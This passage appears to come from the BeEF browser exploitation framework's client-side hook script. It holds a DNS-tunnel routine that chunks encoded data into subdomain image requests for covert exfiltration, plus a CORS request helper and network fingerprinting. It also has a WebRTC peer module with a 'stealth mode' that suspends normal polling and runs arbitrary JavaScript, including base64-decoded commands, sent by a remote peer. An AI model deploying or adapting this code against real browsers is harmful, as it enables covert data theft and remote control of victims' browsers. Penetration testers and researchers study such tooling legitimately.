        beef.debug(encodedData);
        beef.debug("_encodedData_ length: " + encodedData.length);

        // limitations to DNS according to RFC 1035:
        // o Domain names must only consist of a-z, A-Z, 0-9, hyphen (-) and fullstop (.) characters
        // o Domain names are limited to 255 characters in length (including dots)
        // o The name space has a maximum depth of 127 levels (ie, maximum 127 subdomains)
        // o Subdomains are limited to 63 characters in length (including the trailing dot)

        // DNS request structure:
        // COMMAND_ID.SEQ_NUM.SEQ_TOT.DATA.DOMAIN
      //max_length: 3.   3   .   3   . 63 . x

        // only max_data_segment_length is currently used to split data into chunks. and only 1 chunk is used per request.
        // for optimal performance, use the following vars and use the whole available space (which needs changes server-side too)
        var reserved_seq_length = 3 + 3 + 3 + 3; // consider also 3 dots
        var max_domain_length = 255 - reserved_seq_length; //leave some space for sequence numbers
        var max_data_segment_length = 63; // by RFC

        beef.debug("max_data_segment_length: " + max_data_segment_length);

        var dom = document.createElement('b');

        String.prototype.chunk = function(n) {
            if (typeof n=='undefined') n=100;
            return this.match(RegExp('.{1,'+n+'}','g'));
        };

        var sendQuery = function(query) {
            var img = new Image;
            //img.src = "http://"+query;
            img.src = beef.net.httpproto + "://" + query; // prevents issues with mixed content
            img.onload = function() { dom.removeChild(this); }
            img.onerror = function() { dom.removeChild(this); }
            dom.appendChild(img);

            //experimental
            //setTimeout(function(){dom.removeChild(img)},1000);
        };

        var segments = encodedData.chunk(max_data_segment_length);

        var ident = "0xb3"; //see extensions/dns/dns.rb, useful to explicitly mark the DNS request as a tunnel request

        beef.debug(segments.length);

        for (var seq=1; seq<=segments.length; seq++) {
            sendQuery(ident + msgId + "." + seq + "." + segments.length + "." + segments[seq-1] + "." + domain);
        }

		// callback - returns the number of queries sent
		if (!!callback) callback(segments.length);

	}

};

beef.regCmp('beef.net.dns');



//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// beef.net.connection - wraps Mozilla's Network Information API
// https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation
// https://developer.mozilla.org/en-US/docs/Web/API/Navigator/connection
beef.net.connection = {

  /* Returns the connection type
   * @example: beef.net.connection.type()
   * @note: https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/type
   * @return: {String} connection type or 'unknown'.
   **/
  type: function () {
    try {
      var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      var type = connection.type;
      if (/^[a-z]+$/.test(type)) return type; else return 'unknown';
    } catch(e) {
      beef.debug("Error retrieving connection type: " + e.message);
      return 'unknown';
    }
  },

  /* Returns the maximum downlink speed of the connection
   * @example: beef.net.connection.downlinkMax()
   * @note: https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/downlinkMax
   * @return: {String} downlink max or 'unknown'.
   **/
  downlinkMax: function () {
    try {
      var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      var max = connection.downlinkMax;
      if (max) return max; else return 'unknown';
    } catch(e) {
      beef.debug("Error retrieving connection downlink max: " + e.message);
      return 'unknown';
    }
  }

};

beef.regCmp('beef.net.connection');



beef.net.cors = {

  handler: "cors",

    /**
     * Response Object - used in the beef.net.request callback
     */
    response:function () {
        this.status  = null;      // 500, 404, 200, 302, etc
        this.headers = null;      // full response headers
        this.body    = null;      // full response body
    },

    /**
     * Make a cross-origin request using CORS
     *
     * @param method {String} HTTP verb ('GET', 'POST', 'DELETE', etc.)
     * @param url {String} url
     * @param data {String} request body
     * @param callback {Function} function to callback on completion
     */
    request: function(method, url, data, callback) {

    var xhr;
    var response = new this.response;

    if (XMLHttpRequest) {
        xhr = new XMLHttpRequest();

        if ('withCredentials' in xhr) {
            xhr.open(method, url, true);
            xhr.onerror = function() {
            };
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    response.headers = this.getAllResponseHeaders()
                    response.body    = this.responseText;
                    response.status  = this.status;
                    if (!!callback) {
                        if (!!response) {
                            callback(response);
                        } else { 
                            callback('ERROR: No Response. CORS requests may be denied for this resource.')
                        }
                    }
                }
            };
            xhr.send(data);
        }
    } else if (typeof XDomainRequest != "undefined") {
        xhr = new XDomainRequest();
        xhr.open(method, url);
        xhr.onerror = function() {
        };
        xhr.onload = function() {
            response.headers = this.getAllResponseHeaders()
            response.body    = this.responseText;
            response.status  = this.status;
            if (!!callback) {
                if (!!response) {
                    callback(response);
                } else {
                    callback('ERROR: No Response. CORS requests may be denied for this resource.')
                }
            }
        };
        xhr.send(data);
    } else {
        if (!!callback) callback('ERROR: Not Supported. CORS is not supported by the browser. The request was not sent.');
    }

    }

};

beef.regCmp('beef.net.cors');



//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.are = {
  status_success: function(){
    return 1;
  },
  status_unknown: function(){
    return 0;
  },
  status_error: function(){
    return -1;
  }
};
beef.regCmp("beef.are");


/*
 *  Copyright (c) 2014 The WebRTC project authors. All Rights Reserved.
 *
 *  Use of this source code is governed by a BSD-style license
 *  that can be found in the LICENSE file in the root of the source
 *  tree.
 */

/* More information about these options at jshint.com/docs/options */
/* jshint browser: true, camelcase: true, curly: true, devel: true,
   eqeqeq: true, forin: false, globalstrict: true, node: true,
   quotmark: single, undef: true, unused: strict */
/* global mozRTCIceCandidate, mozRTCPeerConnection, Promise,
mozRTCSessionDescription, webkitRTCPeerConnection, MediaStreamTrack */
/* exported trace,requestUserMedia */

'use strict';

var getUserMedia = null;
var attachMediaStream = null;
var reattachMediaStream = null;
var webrtcDetectedBrowser = null;
var webrtcDetectedVersion = null;
var webrtcMinimumVersion = null;

function trace(text) {
  // This function is used for logging.
  if (text[text.length - 1] === '\n') {
    text = text.substring(0, text.length - 1);
  }
  if (window.performance) {
    var now = (window.performance.now() / 1000).toFixed(3);
    beef.debug(now + ': ' + text);
  } else {
    beef.debug(text);
  }
}

if (navigator.mozGetUserMedia) {

  webrtcDetectedBrowser = 'firefox';

  // the detected firefox version.
  webrtcDetectedVersion =
    parseInt(navigator.userAgent.match(/Firefox\/([0-9]+)\./)[1], 10);

  // the minimum firefox version still supported by adapter.
  webrtcMinimumVersion = 31;

  // The RTCPeerConnection object.
  window.RTCPeerConnection = function(pcConfig, pcConstraints) {
    if (webrtcDetectedVersion < 38) {
      // .urls is not supported in FF < 38.
      // create RTCIceServers with a single url.
      if (pcConfig && pcConfig.iceServers) {
        var newIceServers = [];
        for (var i = 0; i < pcConfig.iceServers.length; i++) {
          var server = pcConfig.iceServers[i];
          if (server.hasOwnProperty('urls')) {
            for (var j = 0; j < server.urls.length; j++) {
              var newServer = {
                url: server.urls[j]
              };
              if (server.urls[j].indexOf('turn') === 0) {
                newServer.username = server.username;
                newServer.credential = server.credential;
              }
              newIceServers.push(newServer);
            }
          } else {
            newIceServers.push(pcConfig.iceServers[i]);
          }
        }
        pcConfig.iceServers = newIceServers;
      }
    }
    return new mozRTCPeerConnection(pcConfig, pcConstraints);
  };

  // The RTCSessionDescription object.
  window.RTCSessionDescription = mozRTCSessionDescription;

  // The RTCIceCandidate object.
  window.RTCIceCandidate = mozRTCIceCandidate;

  // getUserMedia constraints shim.
  getUserMedia = (webrtcDetectedVersion < 38) ?
      function(c, onSuccess, onError) {
    var constraintsToFF37 = function(c) {
      if (typeof c !== 'object' || c.require) {
        return c;
      }
      var require = [];
      Object.keys(c).forEach(function(key) {
        var r = c[key] = (typeof c[key] === 'object') ?
            c[key] : {ideal: c[key]};
        if (r.exact !== undefined) {
          r.min = r.max = r.exact;
          delete r.exact;
        }
        if (r.min !== undefined || r.max !== undefined) {
          require.push(key);
        }
        if (r.ideal !== undefined) {
          c.advanced = c.advanced || [];
          var oc = {};
          oc[key] = {min: r.ideal, max: r.ideal};
          c.advanced.push(oc);
          delete r.ideal;
          if (!Object.keys(r).length) {
            delete c[key];
          }
        }
      });
      if (require.length) {
        c.require = require;
      }
      return c;
    };
    beef.debug('spec: ' + JSON.stringify(c));
    c.audio = constraintsToFF37(c.audio);
    c.video = constraintsToFF37(c.video);
    beef.debug('ff37: ' + JSON.stringify(c));
    return navigator.mozGetUserMedia(c, onSuccess, onError);
  } : navigator.mozGetUserMedia.bind(navigator);

  navigator.getUserMedia = getUserMedia;

  // Shim for mediaDevices on older versions.
  if (!navigator.mediaDevices) {
    navigator.mediaDevices = {getUserMedia: requestUserMedia,
      addEventListener: function() { },
      removeEventListener: function() { }
    };
  }
  navigator.mediaDevices.enumerateDevices =
      navigator.mediaDevices.enumerateDevices || function() {
    return new Promise(function(resolve) {
      var infos = [
        {kind: 'audioinput', deviceId: 'default', label:'', groupId:''},
        {kind: 'videoinput', deviceId: 'default', label:'', groupId:''}
      ];
      resolve(infos);
    });
  };

  if (webrtcDetectedVersion < 41) {
    // Work around http://bugzil.la/1169665
    var orgEnumerateDevices =
        navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices);
    navigator.mediaDevices.enumerateDevices = function() {
      return orgEnumerateDevices().catch(function(e) {
        if (e.name === 'NotFoundError') {
          return [];
        }
        throw e;
      });
    };
  }
  // Attach a media stream to an element.
  attachMediaStream = function(element, stream) {
    beef.debug('Attaching media stream');
    element.mozSrcObject = stream;
  };

  reattachMediaStream = function(to, from) {
    beef.debug('Reattaching media stream');
    to.mozSrcObject = from.mozSrcObject;
  };

} else if (navigator.webkitGetUserMedia) {

  webrtcDetectedBrowser = 'chrome';

  // the detected chrome version.
  webrtcDetectedVersion =
    parseInt(navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./)[2], 10);

  // the minimum chrome version still supported by adapter.
  webrtcMinimumVersion = 38;

  // The RTCPeerConnection object.
  window.RTCPeerConnection = function(pcConfig, pcConstraints) {
    var pc = new webkitRTCPeerConnection(pcConfig, pcConstraints);
    var origGetStats = pc.getStats.bind(pc);
    pc.getStats = function(selector, successCallback, errorCallback) { // jshint ignore: line
      // If selector is a function then we are in the old style stats so just
      // pass back the original getStats format to avoid breaking old users.
      if (typeof selector === 'function') {
        return origGetStats(selector, successCallback);
      }

      var fixChromeStats = function(response) {
        var standardReport = {};
        var reports = response.result();
        reports.forEach(function(report) {
          var standardStats = {
            id: report.id,
            timestamp: report.timestamp,
            type: report.type
          };
          report.names().forEach(function(name) {
            standardStats[name] = report.stat(name);
          });
          standardReport[standardStats.id] = standardStats;
        });

        return standardReport;
      };
      var successCallbackWrapper = function(response) {
        successCallback(fixChromeStats(response));
      };
      return origGetStats(successCallbackWrapper, selector);
    };

    return pc;
  };

  // add promise support
  ['createOffer', 'createAnswer'].forEach(function(method) {
    var nativeMethod = webkitRTCPeerConnection.prototype[method];
    webkitRTCPeerConnection.prototype[method] = function() {
      var self = this;
      if (arguments.length < 1 || (arguments.length === 1 &&
          typeof(arguments[0]) === 'object')) {
        var opts = arguments.length === 1 ? arguments[0] : undefined;
        return new Promise(function(resolve, reject) {
          nativeMethod.apply(self, [resolve, reject, opts]);
        });
      } else {
        return nativeMethod.apply(this, arguments);
      }
    };
  });

  ['setLocalDescription', 'setRemoteDescription',
      'addIceCandidate'].forEach(function(method) {
    var nativeMethod = webkitRTCPeerConnection.prototype[method];
    webkitRTCPeerConnection.prototype[method] = function() {
      var args = arguments;
      var self = this;
      return new Promise(function(resolve, reject) {
        nativeMethod.apply(self, [args[0],
            function() {
              resolve();
              if (args.length >= 2) {
                args[1].apply(null, []);
              }
            },
            function(err) {
              reject(err);
              if (args.length >= 3) {
                args[2].apply(null, [err]);
              }
            }]
          );
      });
    };
  });

  // getUserMedia constraints shim.
  getUserMedia = function(c, onSuccess, onError) {
    var constraintsToChrome = function(c) {
      if (typeof c !== 'object' || c.mandatory || c.optional) {
        return c;
      }
      var cc = {};
      Object.keys(c).forEach(function(key) {
        if (key === 'require' || key === 'advanced') {
          return;
        }
        var r = (typeof c[key] === 'object') ? c[key] : {ideal: c[key]};
        if (r.exact !== undefined && typeof r.exact === 'number') {
          r.min = r.max = r.exact;
        }
        var oldname = function(prefix, name) {
          if (prefix) {
            return prefix + name.charAt(0).toUpperCase() + name.slice(1);
          }
          return (name === 'deviceId') ? 'sourceId' : name;
        };
        if (r.ideal !== undefined) {
          cc.optional = cc.optional || [];
          var oc = {};
          if (typeof r.ideal === 'number') {
            oc[oldname('min', key)] = r.ideal;
            cc.optional.push(oc);
            oc = {};
            oc[oldname('max', key)] = r.ideal;
            cc.optional.push(oc);
          } else {
            oc[oldname('', key)] = r.ideal;
            cc.optional.push(oc);
          }
        }
        if (r.exact !== undefined && typeof r.exact !== 'number') {
          cc.mandatory = cc.mandatory || {};
          cc.mandatory[oldname('', key)] = r.exact;
        } else {
          ['min', 'max'].forEach(function(mix) {
            if (r[mix] !== undefined) {
              cc.mandatory = cc.mandatory || {};
              cc.mandatory[oldname(mix, key)] = r[mix];
            }
          });
        }
      });
      if (c.advanced) {
        cc.optional = (cc.optional || []).concat(c.advanced);
      }
      return cc;
    };
    beef.debug('spec:   ' + JSON.stringify(c)); // whitespace for alignment
    c.audio = constraintsToChrome(c.audio);
    c.video = constraintsToChrome(c.video);
    beef.debug('chrome: ' + JSON.stringify(c));
    return navigator.webkitGetUserMedia(c, onSuccess, onError);
  };
  navigator.getUserMedia = getUserMedia;

  // Attach a media stream to an element.
  attachMediaStream = function(element, stream) {
    if (typeof element.srcObject !== 'undefined') {
      element.srcObject = stream;
    } else if (typeof element.src !== 'undefined') {
      element.src = URL.createObjectURL(stream);
    } else {
      beef.debug('Error attaching stream to element.');
    }
  };

  reattachMediaStream = function(to, from) {
    to.src = from.src;
  };

  if (!navigator.mediaDevices) {
    navigator.mediaDevices = {getUserMedia: requestUserMedia,
                              enumerateDevices: function() {
      return new Promise(function(resolve) {
        var kinds = {audio: 'audioinput', video: 'videoinput'};
        return MediaStreamTrack.getSources(function(devices) {
          resolve(devices.map(function(device) {
            return {label: device.label,
                    kind: kinds[device.kind],
                    deviceId: device.id,
                    groupId: ''};
          }));
        });
      });
    }};
    // in case someone wants to listen for the devicechange event.
    navigator.mediaDevices.addEventListener = function() { };
    navigator.mediaDevices.removeEventListener = function() { };
  }
} else if (navigator.mediaDevices && navigator.userAgent.match(
    /Edge\/(\d+).(\d+)$/)) {
  webrtcDetectedBrowser = 'edge';

  webrtcDetectedVersion =
    parseInt(navigator.userAgent.match(/Edge\/(\d+).(\d+)$/)[2], 10);

  // the minimum version still supported by adapter.
  webrtcMinimumVersion = 12;

  attachMediaStream = function(element, stream) {
    element.srcObject = stream;
  };
  reattachMediaStream = function(to, from) {
    to.srcObject = from.srcObject;
  };
} else {
  // console.log('Browser does not appear to be WebRTC-capable');
}

// Returns the result of getUserMedia as a Promise.
function requestUserMedia(constraints) {
  return new Promise(function(resolve, reject) {
    getUserMedia(constraints, resolve, reject);
  });
}

if (typeof module !== 'undefined') {
  module.exports = {
    RTCPeerConnection: window.RTCPeerConnection,
    getUserMedia: getUserMedia,
    attachMediaStream: attachMediaStream,
    reattachMediaStream: reattachMediaStream,
    webrtcDetectedBrowser: webrtcDetectedBrowser,
    webrtcDetectedVersion: webrtcDetectedVersion,
    webrtcMinimumVersion: webrtcMinimumVersion
    //requestUserMedia: not exposed on purpose.
    //trace: not exposed on purpose.
  };
} else if ((typeof require === 'function') && (typeof define === 'function')) {
  // Expose objects and functions when RequireJS is doing the loading.
  define([], function() {
    return {
      RTCPeerConnection: window.RTCPeerConnection,
      getUserMedia: getUserMedia,
      attachMediaStream: attachMediaStream,
      reattachMediaStream: reattachMediaStream,
      webrtcDetectedBrowser: webrtcDetectedBrowser,
      webrtcDetectedVersion: webrtcDetectedVersion,
      webrtcMinimumVersion: webrtcMinimumVersion
      //requestUserMedia: not exposed on purpose.
      //trace: not exposed on purpose.
    };
  });
}


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


/**
 * @Literal object: beef.webrtc
 *
 * Manage the WebRTC peer to peer communication channels.
 * This objects contains all the necessary client-side WebRTC components,
 * allowing browsers to use WebRTC to communicate with each other.
 * To provide signaling, the WebRTC extension sets up custom listeners.
 *  /rtcsignal - for sending RTC signalling information between peers
 *  /rtcmessage - for client-side rtc messages to be submitted back into beef and logged.
 *
 * To ensure signaling gets back to the peers, the hook.js dynamic construction also includes
 * the signalling.
 *
 * This is all mostly a Proof of Concept
 */

beefrtcs = {}; // To handle multiple peers - we need to have a hash of Beefwebrtc objects
               // The key is the peer id
globalrtc = {}; // To handle multiple Peers - we have to have a global hash of RTCPeerConnection objects
                // these objects persist outside of everything else 
                // The key is the peer id
rtcstealth = false; // stealth should only be initiated from one peer - this global variable will contain:
                    // false - i.e not stealthed; or
                    // <peerid> - i.e. the id of the browser which initiated stealth mode
rtcrecvchan = {}; // To handle multiple event channels - we need to have a global hash of these
                  // The key is the peer id

// Beefwebrtc object - wraps everything together for a peer connection
// One of these per peer connection, and will be stored in the beefrtc global hash
function Beefwebrtc(initiator,peer,turnjson,stunservers,verbparam) {
    this.verbose = typeof verbparam !== 'undefined' ? verbparam : false; // whether this object is verbose or not
    this.initiator = typeof initiator !== 'undefined' ? initiator : 0; // if 1 - this is the caller; if 0 - this is the receiver
    this.peerid = typeof peer !== 'undefined' ? peer : null; // id of this rtc peer
    this.turnjson = turnjson; // set of TURN servers in the format:
                              // {"username": "<username", "password": "<password>", "uris": [
                              //    "turn:<ip>:<port>?transport=<udp/tcp>",
                              //    "turn:<ip>:<port>?transport=<udp/tcp>"]}
    this.started = false; // Has signaling / dialing started for this peer
    this.gotanswer = false; // For the caller - this determines whether they have received an SDP answer from the receiver
    this.turnDone = false; // does the pcConfig have TURN servers added to it?
    this.signalingReady = false; // the initiator (Caller) is always ready to signal. So this sets to true during init
                                 // the receiver will set this to true once it receives an SDP 'offer'
    this.msgQueue = []; // because the handling of SDP signals may happen in any order - we need a queue for them
    this.pcConfig = null; // We set this during init
    this.pcConstraints = {"optional": [{"googImprovedWifiBwe": true}]} // PeerConnection constraints
    this.offerConstraints = {"optional": [], "mandatory": {}}; // Default SDP Offer Constraints - used in the caller
    this.sdpConstraints = {'optional': [{'RtpDataChannels':true}]}; // Default SDP Constraints - used by caller and receiver
    this.gatheredIceCandidateTypes = { Local: {}, Remote: {} }; // ICE Candidates
    this.allgood = false; // Is this object / peer connection with the nominated peer ready to go?
    this.dataChannel = null; // The data channel used by this peer
    this.stunservers = stunservers; // set of STUN servers, in the format:
                                    // ["stun:stun.l.google.com:19302","stun:stun1.l.google.com:19302"]
}

// Initialize the object
Beefwebrtc.prototype.initialize = function() {
  if (this.peerid == null) {
    return 0; // no peerid - NO DICE
  }

  // Initialise the pcConfig hash with the provided stunservers
  var stuns = JSON.parse(this.stunservers);
  this.pcConfig = {"iceServers": [{"urls":stuns, "username":"user",
    "credential":"pass"}]};

  // We're not getting the browsers to request their own TURN servers, we're specifying them through BeEF
  // this.forceTurn(this.turnjson);
  this.turnDone = true;

  // Caller is always ready to create peerConnection.
  this.signalingReady = this.initiator;

  // Start .. maybe 
  this.maybeStart();

  // If the window is closed, send a signal to beef .. this is not all that great, so just commenting out
  // window.onbeforeunload = function() {
  //   this.sendSignalMsg({type: 'bye'});
  // }

  return 1; // because .. yeah .. we had a peerid - this is good yar.
}

//Forces the TURN configuration (we can't query that computeengine thing because it's CORS is restrictive)
//These values are now simply passed in from the config.yaml for the webrtc extension
Beefwebrtc.prototype.forceTurn = function(jason) {
    var turnServer = JSON.parse(jason);
    var iceServers = createIceServers(turnServer.uris,
                                      turnServer.username,
                                      turnServer.password);
    if (iceServers !== null) {
        this.pcConfig.iceServers = this.pcConfig.iceServers.concat(iceServers);
    }
    beef.debug("Got TURN servers, will try and maybestart again..");
    this.turnDone = true;
    this.maybeStart();
}

// Try and establish the RTC connection
Beefwebrtc.prototype.createPeerConnection = function() {
  beef.debug('Creating RTCPeerConnnection with the following options:\n' +
            '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
            '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
  try {
    // Create an RTCPeerConnection via the polyfill (webrtcadapter.js).
    globalrtc[this.peerid] = new RTCPeerConnection(this.pcConfig, this.pcConstraints);
    globalrtc[this.peerid].onicecandidate = this.onIceCandidate;
    beef.debug('Created RTCPeerConnnection with the following options:\n' +
              '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
              '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
    
  } catch (e) {
    beef.debug('Failed to create PeerConnection, exception: ');
    beef.debug(e);
    return;
  }

  // Assign event handlers to signalstatechange, iceconnectionstatechange, datachannel etc
  globalrtc[this.peerid].onsignalingstatechange = this.onSignalingStateChanged;
  globalrtc[this.peerid].oniceconnectionstatechange = this.onIceConnectionStateChanged;
  globalrtc[this.peerid].ondatachannel = this.onDataChannel;
  this.dataChannel = globalrtc[this.peerid].createDataChannel("sendDataChannel", {reliable:false});
}

// When the PeerConnection receives a new ICE Candidate
Beefwebrtc.prototype.onIceCandidate = function(event) {
  var peerid = null;

  for (var k in beefrtcs) {
    if (beefrtcs[k].allgood === false) {
      peerid = beefrtcs[k].peerid;
    }
  }

  beef.debug("Handling onicecandidate event while connecting to peer: " + peerid + ". Event received:");
  beef.debug(event);

  if (event.candidate) {
    // Send the candidate to the peer via the BeEF signalling channel
    beefrtcs[peerid].sendSignalMsg({type: 'candidate',
                 label: event.candidate.sdpMLineIndex,
                 id: event.candidate.sdpMid,
                 candidate: event.candidate.candidate});
    // Note this ICE candidate locally
    beefrtcs[peerid].noteIceCandidate("Local", beefrtcs[peerid].iceCandidateType(event.candidate.candidate));
  } else {
    beef.debug('End of candidates.');
  }
}

// For all rtc signalling messages we receive as part of hook.js polling - we have to process them with this function
// This will either add messages to the msgQueue and try and kick off maybeStart - or it'll call processSignalingMessage
// against the message directly
Beefwebrtc.prototype.processMessage = function(message) {
  beef.debug('Signalling Message - S->C: ' + JSON.stringify(message));
  var msg = JSON.parse(message);

  if (!this.initiator && !this.started) { // We are currently the receiver AND we have NOT YET received an SDP Offer
    beef.debug('processing the message, as a receiver');
    if (msg.type === 'offer') { // This IS an SDP Offer
      beef.debug('.. and the message is an offer .. ');
      this.msgQueue.unshift(msg); // put it on the top of the msgqueue
      this.signalingReady = true; // As the receiver, we've now got an SDP Offer, so lets set signalingReady to true
      this.maybeStart(); // Lets try and start again - this will end up with calleeStart() getting executed
    } else { // This is NOT an SDP Offer - as the receiver, just add it to the queue
      beef.debug(' .. the message is NOT an offer .. ');
      this.msgQueue.push(msg);
    }
  } else if (this.initiator && !this.gotanswer) { // We are currently the caller AND we have NOT YET received the SDP Answer
    beef.debug('processing the message, as the sender, no answers yet');
    if (msg.type === 'answer') { // This IS an SDP Answer
        beef.debug('.. and we have an answer ..');
        this.processSignalingMessage(msg); // Process the message directly
        this.gotanswer = true; // We have now received an answer
        //process all other queued message...
        while (this.msgQueue.length > 0) {
            this.processSignalingMessage(this.msgQueue.shift());
        }
    } else { // This is NOT an SDP Answer - as the caller, just add it to the queue
        beef.debug('.. not an answer ..');
        this.msgQueue.push(msg);
    }
  } else { // For all other messages just drop them in the queue
    beef.debug('processing a message, but, not as a receiver, OR, the rtc is already up');
    this.processSignalingMessage(msg);
  } 
}

// Send a signalling message .. 
Beefwebrtc.prototype.sendSignalMsg = function(message) {
  var msgString = JSON.stringify(message);
  beef.debug('Signalling Message - C->S: ' + msgString);
  beef.net.send('/rtcsignal',0,{targetbeefid: this.peerid, signal: msgString});
}

// Used to record ICS candidates locally
Beefwebrtc.prototype.noteIceCandidate = function(location, type) {
  if (this.gatheredIceCandidateTypes[location][type])
    return;
  this.gatheredIceCandidateTypes[location][type] = 1;
  // updateInfoDiv();
}

// When the signalling state changes. We don't actually do anything with this except log it.
Beefwebrtc.prototype.onSignalingStateChanged = function(event) {
  beef.debug("Signalling has changed to: " + event.target.signalingState);
}

// When the ICE Connection State changes - this is useful to determine connection statuses with peers.
Beefwebrtc.prototype.onIceConnectionStateChanged = function(event) {
  var peerid = null;

  for (k in globalrtc) {
    if ((globalrtc[k].localDescription.sdp === event.target.localDescription.sdp) && (globalrtc[k].localDescription.type === event.target.localDescription.type)) {
      peerid = k;
    }
  }

  beef.debug("ICE with peer: " + peerid + " has changed to: " + event.target.iceConnectionState);

  // ICE Connection Status has connected - this is good. Normally means the RTCPeerConnection is ready! Although may still look for 
  // better candidates or connections
  if (event.target.iceConnectionState === 'connected') {
    //Send status to peer
    window.setTimeout(function() {
        beefrtcs[peerid].sendPeerMsg('ICE Status: '+event.target.iceConnectionState);
        beefrtcs[peerid].allgood = true;
        },1000);
  }

  // Completed is similar to connected. Except, each of the ICE components are good, and no more testing remote candidates is done.
  if (event.target.iceConnectionState === 'completed') {
    window.setTimeout(function() {
      beefrtcs[peerid].sendPeerMsg('ICE Status: '+event.target.iceConnectionState);
      beefrtcs[peerid].allgood = true;
    },1000);
  }

  if ((rtcstealth == peerid) && (event.target.iceConnectionState === 'disconnected')) {
    //I was in stealth mode, talking back to this peer - but it's gone offline.. come out of stealth
    rtcstealth = false;
    beefrtcs[peerid].allgood = false;
    beef.net.send('/rtcmessage',0,{peerid: peerid, message: peerid + " - has apparently gotten disconnected"});
  } else if ((rtcstealth == false) && (event.target.iceConnectionState === 'disconnected')) {
    //I was not in stealth, and this peer has gone offline - send a message
    beefrtcs[peerid].allgood = false;
    beef.net.send('/rtcmessage',0,{peerid: peerid, message: peerid + " - has apparently gotten disconnected"});
  }
  // We don't handle situations where a stealthed peer loses a peer that is NOT the peer that made it go into stealth
  // This is possibly a bad idea - @xntrik


}

// This is the function when a peer tells us to go into stealth by sending a dataChannel message of "!gostealth"
Beefwebrtc.prototype.goStealth = function() {
    //stop the beef updater
    rtcstealth = this.peerid; // this is a global variable
    beef.updater.lock = true;
    this.sendPeerMsg('Going into stealth mode');

    setTimeout(function() {rtcpollPeer()}, beef.updater.xhr_poll_timeout * 5);
}

// This is the actual poller when in stealth, it is global as well because we're using the setTimeout to execute it
rtcpollPeer = function() {
    if (rtcstealth == false) {
        //my peer has disabled stealth mode
        beef.updater.lock = false;
        return;
    }

    beef.debug('lub dub');

    beefrtcs[rtcstealth].sendPeerMsg('Stayin alive'); // This is the heartbeat we send back to the peer that made us stealth

    setTimeout(function() {rtcpollPeer()}, beef.updater.xhr_poll_timeout * 5);
}

// When a data channel has been established - within here is the message handling function as well
Beefwebrtc.prototype.onDataChannel = function(event) {
  var peerid = null;
  for (k in globalrtc) {
    if ((globalrtc[k].localDescription.sdp === event.currentTarget.localDescription.sdp) && (globalrtc[k].localDescription.type === event.currentTarget.localDescription.type)) {
      peerid = k;
    }
  }

  beef.debug("Peer: " + peerid + " has just handled the onDataChannel event");
  rtcrecvchan[peerid] = event.channel;

  // This is the onmessage event handling within the datachannel
  rtcrecvchan[peerid].onmessage = function(ev2) {
    beef.debug("Received an RTC message from my peer["+peerid+"]: " + ev2.data);

    // We've received the command to go into stealth mode
    if (ev2.data == "!gostealth") {
        if (beef.updater.lock == true) {
            setTimeout(function() {beefrtcs[peerid].goStealth()},beef.updater.xhr_poll_timeout * 0.4);
        } else {
            beefrtcs[peerid].goStealth();
        }

    // The message to come out of stealth
    } else if (ev2.data == "!endstealth") {

      if (rtcstealth != null) {
        beefrtcs[rtcstealth].sendPeerMsg("Coming out of stealth...");
        rtcstealth = false;
      }

    // Command to perform arbitrary JS (while stealthed)
    } else if ((rtcstealth != false) && (ev2.data.charAt(0) == "%")) {
      beef.debug('message was a command: '+ev2.data.substring(1) + ' .. and I am in stealth mode');
      beefrtcs[rtcstealth].sendPeerMsg("Command result - " + beefrtcs[rtcstealth].execCmd(ev2.data.substring(1)));

    // Command to perform arbitrary JS (while NOT stealthed)
    } else if ((rtcstealth == false) && (ev2.data.charAt(0) == "%")) {
      beef.debug('message was a command - we are not in stealth. Command: '+ ev2.data.substring(1));
      beefrtcs[peerid].sendPeerMsg("Command result - " + beefrtcs[peerid].execCmd(ev2.data.substring(1)));

    // B64d command from the /cmdexec API
    } else if (ev2.data.charAt(0) == "@") {
      beef.debug('message was a b64d command');

      var fn = new Function(atob(ev2.data.substring(1)));
      fn();
      if (rtcstealth != false) { // force stealth back on ?
        beef.updater.execute_commands(); // FORCE execution while stealthed
        beef.updater.lock = true;
      }


    // Just a plain text message .. (while stealthed)
    } else if (rtcstealth != false) {
      beef.debug('received a message, apparently we are in stealth - so just send it back to peer['+rtcstealth+']');
      beefrtcs[rtcstealth].sendPeerMsg(ev2.data);

    // Just a plan text message (while NOT stealthed)
    } else {
      beef.debug('received a message from peer['+peerid+'] - sending it back to beef');
      beef.net.send('/rtcmessage',0,{peerid: peerid, message: ev2.data});
    }
  } 
}

// How the browser executes received JS (this is pretty hacky)
Beefwebrtc.prototype.execCmd = function(input) {
  var fn = new Function(input);
  var res = fn();
  return res.toString();
}

// Shortcut function to SEND a data messsage
Beefwebrtc.prototype.sendPeerMsg = function(msg) {
  beef.debug('sendPeerMsg to ' + this.peerid);
  this.dataChannel.send(msg);
}

// Try and initiate, will check that system hasn't started, and that signaling is ready, and that TURN servers are ready
Beefwebrtc.prototype.maybeStart = function() {
  beef.debug("maybe starting ... ");

  if (!this.started && this.signalingReady && this.turnDone) {
    beef.debug('Creating PeerConnection.');
    this.createPeerConnection();

    this.started = true;

    if (this.initiator) {
      beef.debug("Making the call now .. bzz bzz");
      this.doCall();
    } else {
      beef.debug("Receiving a call now .. somebuddy answer da fone?");
      this.calleeStart();
    }

  } else {
    beef.debug("Not ready to start just yet..");
  }
}

// RTC - create an offer - the caller runs this, while the receiver runs calleeStart()
Beefwebrtc.prototype.doCall = function() {
